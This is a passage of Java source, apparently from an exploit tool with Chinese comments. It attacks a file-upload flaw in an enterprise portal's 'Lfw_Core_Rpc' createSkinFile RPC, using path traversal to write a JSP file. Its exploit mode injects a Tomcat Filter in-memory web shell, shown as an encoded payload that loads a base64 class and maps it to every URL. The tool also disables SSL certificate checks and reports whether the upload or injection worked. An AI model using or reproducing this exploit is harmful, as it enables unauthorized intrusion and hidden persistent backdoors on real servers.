2520filterConfigs%2520%253D%2520(Map)%2520Configs.get(standardContext)%253Bif%2520(filterConfigs.get(name)%2520%253D%253D%2520null)%257B%2520Method%2520defineClassMethod%2520%253D%2520ClassLoader.class.getDeclaredMethod(%2522defineClass%2522%252C%2520byte%255B%255D.class%252C%2520int.class%252C%2520int.class)%253BdefineClassMethod.setAccessible(true)%253BClass%2520filterClass%2520%253D%2520(Class)%2520defineClassMethod.invoke(Thread.currentThread().getContextClassLoader()%252C%2520new%2520BASE64Decoder().decodeBuffer(filter_string)%252C%25200%252C%2520new%2520BASE64Decoder().decodeBuffer(filter_string).length)%253BFilter%2520filter%2520%253D%2520(Filter)%2520filterClass.newInstance()%253BFilterDef%2520filterDef%2520%253D%2520new%2520FilterDef()%253BfilterDef.setFilter(filter)%253BfilterDef.setFilterName(name)%253BfilterDef.setFilterClass(filter.getClass().getName())%253BstandardContext.addFilterDef(filterDef)%253BFilterMap%2520filterMap%2520%253D%2520new%2520FilterMap()%253BfilterMap.addURLPattern(%2522%252F*%2522)%253BfilterMap.setFilterName(name)%253BfilterMap.setDispatcher(DispatcherType.REQUEST.name())%253BstandardContext.addFilterMapBefore(filterMap)%253BConstructor%2520constructor%2520%253D%2520ApplicationFilterConfig.class.getDeclaredConstructor(Context.class%252CFilterDef.class)%253Bconstructor.setAccessible(true)%253BApplicationFilterConfig%2520filterConfig%2520%253D%2520(ApplicationFilterConfig)%2520constructor.newInstance(standardContext%252CfilterDef)%253BfilterConfigs.put(name%252CfilterConfig)%253Bout.print(%2522%253E%2540%253C%2522)%253B%257D%2525%253E\"}";
        String poc_data = "%25%33%65%25%34%30%25%33%63\"}";
        String postData = null;

        // 生成最终上传数据
        if (Config.MOD.equals(Mod.POC)) {
            filename = System.currentTimeMillis() + ".jsp";
            data_base = "setdebugmode=2&&rpcdata={\"rpcname\":\"nc.uap.portal.service.itf.IPortalSpecService\",\"method\":\"createSkinFile\",\"params0\":\"webapps%25%32%66nc_web%25%32%66\",\"params1\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params2\":\"%25%32%65%25%32%65%25%32%66\",\"params3\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params4\":\"" + filename + "\",\"params5\":\"";
            postData = data_base + poc_data;
        } else if (Config.MOD.equals(Mod.EXP)) {
            filename = System.currentTimeMillis() + ".jsp";
            data_base = "setdebugmode=2&&rpcdata={\"rpcname\":\"nc.uap.portal.service.itf.IPortalSpecService\",\"method\":\"createSkinFile\",\"params0\":\"webapps%25%32%66nc_web%25%32%66\",\"params1\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params2\":\"%25%32%65%25%32%65%25%32%66\",\"params3\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params4\":\"" + filename + "\",\"params5\":\"";
            postData = data_base + exp_data;
        } else if (Config.MOD.equals(Mod.UPLOAD)) {
            filename = Config.FILENAME;
            data_base = "setdebugmode=2&&rpcdata={\"rpcname\":\"nc.uap.portal.service.itf.IPortalSpecService\",\"method\":\"createSkinFile\",\"params0\":\"webapps%25%32%66nc_web%25%32%66\",\"params1\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params2\":\"%25%32%65%25%32%65%25%32%66\",\"params3\":\"%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66\",\"params4\":\"" + filename + "\",\"params5\":\"";
            // 文件内容需要经过两次url编码
            postData = data_base + Util.fullyURLEncode(Util.fullyURLEncode(Config.FILETEXT)) + "\"}";
        }

        // 设置全局http代理
        HttpProxy.setProxy();

        // 信任ssl证书
        SSLUtil.trustAllCertificates();

        //发送请求
        try {
            URL apiUrl = new URL(vulnerable_url);
            HttpURLConnection conn1 = (HttpURLConnection) apiUrl.openConnection();
            conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            // 设置超时
            HttpUtil.setTimeout(conn1);

            byte[] input = postData.getBytes("UTF-8");
            HttpUtil.post(conn1, input);

            // 获取响应吗 声明响应体
            int responseCode1 = HttpUtil.getResponseCode(conn1);


            if (responseCode1 == HttpURLConnection.HTTP_OK) {
                // 检测上传文件是否存在
                URL fileUrl = new URL(Config.TARGET + "/" + filename);
                HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();

                // 设置超时
                HttpUtil.setTimeout(conn2);

                // get请求
                HttpUtil.get(conn2);

                // 获取响应代码
                int responseCode2 = HttpUtil.getResponseCode(conn2);

                // 获取响应内容
                String response2 = HttpUtil.getResponseText(conn2);

                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                    if (response2.contains(flag) && Config.MOD.equals(Mod.POC)) {
                        logMessage("[+] Lfw_Core_Rpc 文件上传漏洞存在! 成功上传测试文件: " + fileUrl);
                        return;
                    } else if (response2.contains(flag) && Config.MOD.equals(Mod.EXP)) {
                        logMessage("[+] Filter 类型内存马注入成功, 请手动连接验证.");
                        return;
                    } else if (Config.MOD.equals(Mod.UPLOAD)) {
                        logUpload("[+] 文件上传成功! 文件地址: " + fileUrl);
                        return;
                    }
                } else {
                    if (Config.MOD.equals(Mod.POC)) {
                        logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请尝试手动验证漏洞.");
                        return;
                    } else if (Config.MOD.equals(Mod.EXP)) {
                        logMessage("[-] 内存马注入失败, 请手动验证漏洞.");
                        return;
                    } else if (Config.MOD.equals(Mod.UPLOAD)) {
                        logUpload("[-] 文件上传失败, 请手动验证漏洞.");
                        return;
                    }
                }

            } else {
                if (Config.MOD.equals(Mod.POC)) {
                    logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请尝试手动验证漏洞.");
                    return;
                } else if (Config.MOD.equals(Mod.EXP)) {
                    logMessage("[-] 内存马注入失败, 请手动验证漏洞.");
                    return;
                } else if (Config.MOD.equals(Mod.UPLOAD)) {
                    logUpload("[-] 文件上传失败, 请手动验证漏洞.");
                    return;
                }
            }
            conn1.disconnect();
        } catch (Exception e) {
            if (Config.MOD.equals(Mod.POC) || Config.MOD.equals(Mod.EXP)) {
                logMessage("[-] Lfw_Core_Rpc 文件上传失败, 请手动验证漏洞. " + e);
                return;
            } else if (Config.MOD.equals(Mod.UPLOAD)) {
                logUpload("[-] Lfw_Core_Rpc 文件上传失败, 请手动验证漏洞. " + e);
                return;
            }
        }

    }
}
